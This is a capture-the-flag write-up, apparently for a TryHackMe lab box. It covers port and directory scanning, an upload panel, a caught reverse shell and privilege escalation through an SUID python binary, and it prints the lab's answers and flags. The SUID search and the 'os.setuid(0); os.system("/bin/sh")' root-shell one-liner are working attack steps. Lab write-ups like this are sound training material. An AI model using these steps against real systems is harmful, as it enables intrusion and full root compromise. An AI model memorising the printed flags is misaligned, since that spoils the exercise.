

```
┌──(gomez22㉿DESKTOP-V2K8SJ4)-[~]
└─$ sudo nmap -sS -Pn 10.10.0.131
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-19 15:58 PDT
Nmap scan report for 10.10.0.131
Host is up (0.24s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 5.90 seconds

```
Scan the machine, how many ports are open?
2


```
/uploads
Apache/2.4.29 (Ubuntu) Server at 10.10.0.131 Port 80
```
What version of Apache is running?
2.4.29

What service is running on port 22?
ssh

```
/uploads              (Status: 301) [Size: 312] [--> http://10.10.0.131/uploads/]
/css                  (Status: 301) [Size: 308] [--> http://10.10.0.131/css/]    
/js                   (Status: 301) [Size: 307] [--> http://10.10.0.131/js/]     
/panel                (Status: 301) [Size: 310] [--> http://10.10.0.131/panel/] 
```
What is the hidden directory?
/panel/





```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../css/panel.css">
    <script src=../"js/maquina_de_escrever.js"></script>
    <title>HackIT - Home</title>
</head>
<body>
    <div class="first">
        <div class="main-div">
            <form action="" method="POST" enctype="multipart/form-data">
                <p>Select a file to upload:</p>
                <input type="file" name="fileUpload" class="fileUpload">
                <input type="submit" value="Upload" name="submit">
                
                <p class='erro'>PHP não é permitido!</p>            </form>
        </div>
    </div>
</body>
</html>

```

```
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1111
Ncat: Listening on 0.0.0.0:1111
Ncat: Connection from 10.10.0.131.
Ncat: Connection from 10.10.0.131:36170.
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 23:34:56 up 38 min,  0 users,  load average: 0.00, 0.00, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```
`python -c ‘import pty;pty.spawn(“/bin/bash”)’`

find / -type f -name user.txt

`/var/www/user.txt
`

```
$ cat user.txt
THM{y0u_g0t_a_sh3ll}
```

```
find / -user root -perm /4000
```

`/usr/bin/python`
```
ls -l python
-rwsr-sr-x 1 root root 3665768 Aug  4  2020 python

```

```
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

https://gtfobins.github.io/gtfobins/python/#suid

```
cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}

```
